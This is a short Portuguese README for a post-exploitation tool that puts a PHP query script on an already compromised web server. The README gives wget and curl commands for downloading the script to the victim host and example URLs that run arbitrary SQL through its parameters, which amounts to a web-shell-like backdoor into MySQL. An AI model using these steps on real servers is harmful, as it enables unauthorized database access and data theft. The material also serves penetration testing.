# MySQL-Web-Query

Existem casos (em um cenário pós-exploração) em que, após comprometer uma aplicação web e obter shell, não é possível interagir com o MySQL em virtude das limitações de interação da shell que foi obtida.

Neste caso o **MySQL-Web-Query** pode ser útil.

### :hammer_and_wrench: Requisitos

É necessário que o web server comprometido use a tecnologia PHP e o MySQL como DBMS.

### 📋 Como usar

Transfira o script para o web server em um diretório acessível via browser:
```
wget https://raw.githubusercontent.com/caique-garbim/MySQL-Web-Query/main/query.php
```
ou
```
curl https://raw.githubusercontent.com/caique-garbim/MySQL-Web-Query/main/query.php > query.php
```
<br>

Deve ser informado os parâmetros **db** (banco de dados) e **q** (query). Exemplos:
```
http://web_server/query.php?db=mysql&q=select user();
```
![image](https://user-images.githubusercontent.com/76706456/178148420-53e2f3bb-6071-486f-900a-6e0d6f7e0582.png)
```
http://web_server/query.php?db=mysql&q=show tables;
```
![image](https://user-images.githubusercontent.com/76706456/178148558-2921f6ad-45f9-446e-95c0-7b0ee3e9f0b0.png)
